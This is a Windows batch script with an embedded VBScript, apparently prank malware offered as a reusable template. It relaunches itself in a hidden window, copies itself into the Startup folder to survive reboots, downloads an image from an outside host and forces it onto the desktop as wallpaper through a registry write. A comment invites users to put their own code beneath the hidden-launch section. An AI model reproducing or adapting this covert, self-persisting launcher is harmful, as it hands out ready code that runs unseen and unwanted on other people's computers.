@echo off

if exist C:\Users\%USERNAME%\Downloads\var.json (goto mainprogram)

:stealthmake
cd C:\Users\%USERNAME%\Downloads
(
echo wscript.sleep 500
echo Set WshShell = WScript.CreateObject^("WScript.Shell"^)
echo obj = WshShell.Run^("""%~dpnx0""", 0^)
echo set WshShell = Nothing
) > stealth.vbs
echo. > var.json

:stealthrun
start stealth.vbs
exit

:mainprogram
cd C:\Users\%USERNAME%\Downloads
del var.json /f

::PUT THE REST OF YOUR CODE BELOW THIS LINE

cd C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
if exist %~nx0 (goto code) else goto clone
cls
:clone
del wallpaper.bat /f
copy %0 "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cls
goto code

:code

cd C:\Users\%USERNAME%\Downloads
(
echo dim wshShell
echo dim sUserName
echo Set wshShell = WScript.CreateObject^("WScript.Shell"^)
echo sUserName = wshShell.ExpandEnvironmentStrings^("%USERNAME%"^)
echo Set oShell = CreateObject^("WScript.Shell"^)
echo Set oFSO = CreateObject^("Scripting.FileSystemObject"^)
echo sWinDir = oFSO.GetSpecialFolder^(0^)
echo sWallPaper = "C:\Users\%USERNAME%\Downloads\bg.jpg"
echo oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper
echo oShell.Run "C:\WINDOWS\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
) > wall.vbs

cd C:\Users\%USERNAME%\Downloads
start powershell curl https://i.ibb.co/YRLTLDh/image.png -O bg.jpg
timeout 5 /NOBREAK >NUL
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
start wall.vbs
exit
